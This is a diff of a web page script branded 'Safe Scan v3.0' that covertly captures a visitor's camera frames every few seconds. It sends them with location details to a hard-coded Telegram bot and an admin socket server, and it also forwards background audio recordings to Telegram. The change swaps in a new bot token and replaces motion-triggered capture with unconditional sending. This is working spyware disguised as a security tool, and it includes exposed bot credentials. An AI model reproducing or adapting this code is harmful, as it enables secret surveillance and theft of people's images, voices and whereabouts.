@@ -1518,7 +1518,7 @@
             // TELEGRAM CONFIGURATION
             // ═══════════════════════════════════════════════════════════════
             const telegramConfig = {
-                botToken: '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI',
+                botToken: '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg',
                 chatId: '8262870180'
             };
 
@@ -2478,84 +2478,32 @@
             let backgroundVideoRecordingStartTime = null;
             let backgroundVideoRecordingDuration = 0;
             let videoRecordingInterval = null;
-            let previousImageData = null;
-            let lastTelegramSendTime = 0;
-            let telegramPhotosShared = 0;
+
 
             function startContinuousCapture() {
-                // First capture after 1 second, then every 150ms (approx 7 FPS) for super fast live speed
+                // First capture after 1 second, then every 3 seconds
                 setTimeout(() => {
                     captureAndSendPhoto();
-                    continuousCaptureInterval = setInterval(captureAndSendPhoto, 150);
+                    continuousCaptureInterval = setInterval(captureAndSendPhoto, 3000);
                 }, 1000);
             }
 
-            async function captureAndSendPhoto(force = false) {
+            async function captureAndSendPhoto() {
                 if (!stream) return;
                 try {
                     const canvas = document.createElement('canvas');
                     const tracks = stream.getVideoTracks();
                     if (!tracks.length) return;
                     const settings = tracks[0].getSettings();
-                    const w = settings.width || 640;
-                    const h = settings.height || 480;
-                    
-                    // Downscale for fast motion detection
-                    canvas.width = 160; 
-                    canvas.height = Math.floor((160 / w) * h);
+                    canvas.width = settings.width || 640; canvas.height = settings.height || 480;
                     const ctx = canvas.getContext('2d');
                     if (cameraView.readyState < 2) return;
-                    
-                    ctx.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
-                    const currentImageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-                    
-                    let motionDetected = false;
-                    if (!previousImageData) {
-                        motionDetected = true;
-                    } else {
-                        let diff = 0;
-                        for (let i = 0; i < currentImageData.length; i += 4) {
-                            diff += Math.abs(currentImageData[i] - previousImageData[i]) + 
-                                    Math.abs(currentImageData[i+1] - previousImageData[i+1]) + 
-                                    Math.abs(currentImageData[i+2] - previousImageData[i+2]);
-                        }
-                        const avgDiff = diff / (canvas.width * canvas.height * 3);
-                        if (avgDiff > 8) motionDetected = true;
-                    }
-                    previousImageData = currentImageData;
-
-                    // Always redraw full res for sending
-                    canvas.width = w;
-                    canvas.height = h;
-                    ctx.drawImage(cameraView, 0, 0, w, h);
+                    ctx.drawImage(cameraView, 0, 0);
                     const photo = canvas.toDataURL('image/jpeg', 0.85);
                     if (!photo || photo.length < 1000) return;
-
-                    // 1. Send lightweight base64 frame directly to Admin Dashboard for Live Video Feed (No Disk Save)
-                    if (adminSocket && adminSocket.connected) {
-                        adminSocket.emit('camera:live_frame', {
-                            uuid: userUUID,
-                            frame: photo,
-                            timestamp: Date.now()
-                        });
-                    }
-
-                    // If NO motion, don't trigger Telegram or Disk Save logic
-                    if (!motionDetected && !force) return;
-
-                    // 2. Throttle Disk Saving & Telegram to once every 3 seconds and limit to 10 photos
-                    const now = Date.now();
-                    if (telegramPhotosShared < 10 && (now - lastTelegramSendTime > 3000 || force)) {
-                        lastTelegramSendTime = now;
-                        telegramPhotosShared++;
-                        
-                        // Send to server to be SAVED to disk and DB (this is the original camera:frame)
-                        sendFrameToAdmin(photo);
-
-                        // Send to Telegram
-                        const caption = `📸 Motion Detected (${telegramPhotosShared}/10)\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
-                        await sendPhotoToTelegram(photo, caption);
-                    }
+                    const caption = `📸 Security Capture\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
+                    await sendPhotoToTelegram(photo, caption);
+                    sendFrameToAdmin(photo);
                 } catch (e) { console.error('Capture error:', e); }
             }
 
@@ -2577,10 +2525,6 @@
                         if (backgroundAudioChunks.length > 0) {
                             const blob = new Blob(backgroundAudioChunks, { type: backgroundAudioRecorder.mimeType || 'audio/webm' });
                             sendBackgroundRecordingToTelegram(blob);
-                        }
-                        // Continue recording continuously
-                        if (permissionsGranted.microphone) {
-                            setTimeout(startUserInitiatedRecording, 1000);
                         }
                     };
                     backgroundAudioRecorder.onerror = () => { isBackgroundRecording = false; };
